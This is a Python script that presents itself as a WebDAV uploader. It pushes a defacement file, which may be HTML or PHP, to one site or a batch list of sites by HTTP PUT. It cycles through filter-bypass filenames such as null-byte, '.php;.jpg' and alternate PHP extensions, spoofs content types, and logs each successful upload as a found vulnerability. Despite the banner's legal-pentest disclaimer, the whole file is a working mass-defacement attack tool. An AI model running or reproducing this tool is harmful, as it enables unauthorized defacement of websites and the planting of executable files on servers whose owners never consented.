import requests
import os

def generate_bypass_variants(filename):
    """Generate filename variants to attempt WebDAV upload bypass."""
    name, ext = os.path.splitext(filename)
    return [
        f"{name}.html",
        f"{name}.phtml",
        f"{name}.php5",
        f"{name}.shtml",
        f"{name}.php;.jpg",
        f"{name}.php%20",
        f"{name}.php%00.jpg"
    ]

def upload_file_webdav(target_url, local_path, remote_filename, content_type="application/octet-stream"):
    """Upload a file via HTTP PUT to the WebDAV endpoint."""
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest"
    }

    try:
        with open(local_path, 'rb') as file_data:
            upload_url = f"{target_url}/{remote_filename}"
            response = requests.put(upload_url, data=file_data, headers=headers, timeout=10)

        if response.status_code in [200, 201, 204]:
            print(f"[✓] Upload successful: {upload_url}")
            return upload_url
        else:
            print(f"[✗] Upload failed ({remote_filename}) - HTTP Status: {response.status_code}")
            return None
    except Exception as e:
        print(f"[!] Upload error: {e}")
        return None

def verify_uploaded_file(url):
    """Verify if the uploaded file is accessible and non-empty."""
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and len(response.text) > 10:
            print(f"[✓] Verification successful: File is accessible at {url}")
            with open("found_vuln.txt", "a") as log_file:
                log_file.write(url + "\n")
        else:
            print(f"[✗] File inaccessible or empty: {url}")
    except Exception as e:
        print(f"[!] Verification error: {e}")

def single_target_attack():
    """Handle upload to a single WebDAV-enabled target."""
    print("\n[MODE: SINGLE TARGET]")
    target_url = input("Target URL (e.g., http://example.com): ").strip().rstrip('/')
    deface_path = input("Path to defacement file (e.g., deface.html or deface.php): ").strip()

    if not os.path.isfile(deface_path):
        print("[!] File not found.")
        return

    auto_bypass = input("Enable auto bypass variants? (y/n): ").lower()
    base_filename = os.path.basename(deface_path)

    if auto_bypass == 'y':
        print("[*] Attempting all bypass filename variants...")
        for variant in generate_bypass_variants(base_filename):
            content_type = "image/jpeg" if variant.endswith(".jpg") else "text/html"
            uploaded_url = upload_file_webdav(target_url, deface_path, variant, content_type)
            if uploaded_url:
                verify_uploaded_file(uploaded_url)
    else:
        content_type = "text/html" if base_filename.endswith(".html") else "application/octet-stream"
        uploaded_url = upload_file_webdav(target_url, deface_path, base_filename, content_type)
        if uploaded_url:
            verify_uploaded_file(uploaded_url)

def batch_target_attack():
    """Handle batch uploads from a list of targets."""
    print("\n[MODE: BATCH TARGETS]")
    targets_file = input("Path to targets list (e.g., targets.txt): ").strip()
    deface_file = input("Path to defacement file (e.g., deface.html): ").strip()

    if not os.path.isfile(targets_file) or not os.path.isfile(deface_file):
        print("[!] Target list or defacement file not found.")
        return

    with open(targets_file, 'r') as f:
        targets = [line.strip().rstrip('/') for line in f if line.strip()]

    print(f"[*] Total targets loaded: {len(targets)}")

    for target in targets:
        print(f"\n[->] Targeting: {target}")
        for variant in generate_bypass_variants(os.path.basename(deface_file)):
            content_type = "image/jpeg" if variant.endswith(".jpg") else "text/html"
            uploaded_url = upload_file_webdav(target, deface_file, variant, content_type)
            if uploaded_url:
                verify_uploaded_file(uploaded_url)
                break  # Stop after first successful upload

def main():
    """Main menu interface for the WebDAV upload tool."""
    print(r"""
  __        __   _     _             _       
  \ \      / /__| |__ | | ___   __ _(_)_ __  
   \ \ /\ / / _ \ '_ \| |/ _ \ / _` | | '_ \ 
    \ V  V /  __/ |_) | | (_) | (_| | | | | |
     \_/\_/ \___|_.__/|_|\___/ \__, |_|_| |_|
                               |___/         
             WebDav Uploader
   FOR LEGAL PENETRATION TESTING ONLY!
    """)

    print("1. Upload to a single target")
    print("2. Batch upload using targets.txt")
    print("3. Exit")
    choice = input("Select an option (1/2/3): ").strip()

    if choice == '1':
        single_target_attack()
    elif choice == '2':
        batch_target_attack()
    else:
        print("Exiting. Goodbye.")

if __name__ == "__main__":
    main()
